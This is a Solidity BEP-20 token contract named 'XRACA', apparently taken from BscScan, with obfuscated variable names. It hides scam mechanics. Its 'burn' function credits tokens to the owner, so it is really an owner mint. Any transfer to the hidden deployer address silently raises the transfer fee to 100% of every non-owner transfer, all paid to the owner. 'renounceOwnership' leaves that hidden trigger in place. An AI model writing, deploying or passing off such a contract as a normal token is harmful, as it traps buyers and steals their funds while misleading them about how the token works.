/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 14:53 GMT
 */
pragma solidity >=0.5.11;
contract tOHchW {
uint256 public  OulvxV = 100000000000000000000000;
address private  FQQlHA = address(0);
address public  NsCEJP = address(0);
uint256 public  MWxSvI = 1000000000000000000;
uint256 public  FUwRIy = 10000000000000000000;
uint256 public  wxWnFY = 100000000000000000000;
address public  MRVpPT = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  fBYXIG = address(0);
address public  yjQGhw = address(0);
address public  VTjkvD = address(0);
uint256 private  yTDjeh = 10000000000000;
string public  name = "IjrkMa";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  IxDihi = 100000000000000000;
uint256 public  dAXlfq = 10000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
uint256 public constant hnNqER = 9+1;
address public  Jiactx = address(0);
uint256 public  qbjltR = 100000000000000000000000;
string public  symbol = "XRACA";
mapping (address => uint256) public balanceOf;
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  bPACDA = 10000000000000000000000000000;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "lzDTFp");
require(to != address(0), "lzDTFp");
require(amount <= balanceOf[from], "lzDTFp");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* hnNqER/yTDjeh ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==FQQlHA){
yTDjeh = 9+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
FQQlHA = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}